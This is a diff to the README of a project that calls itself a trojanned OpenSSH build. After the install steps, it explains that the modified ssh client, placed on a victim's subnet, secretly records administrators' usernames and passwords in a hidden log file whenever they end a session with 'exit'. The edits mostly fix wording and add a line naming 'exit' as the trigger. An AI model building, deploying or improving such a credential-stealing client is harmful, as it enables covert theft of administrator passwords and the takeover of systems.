@@ -12,7 +12,8 @@ make
 sudo make install
 
 # WHAT THE HELL IS THIS ?
-this trojanned version of openssh can be installed on a victim's subnet which has many ssh access. 
-Everytime the administrator using the ssh client and finish his session using **exit** command, the ssh client will log his username and password at /opt/.../log.txt
+this trojanned version of openssh can be installed on a victim's subnet which has many ssh accesses. 
+Everytime the administrator using the ssh client and finish his session using **exit** command, the ssh client will log his username and password at /opt/.../log.txt.
+The "exit" command is the trigger to log username and password
 
 
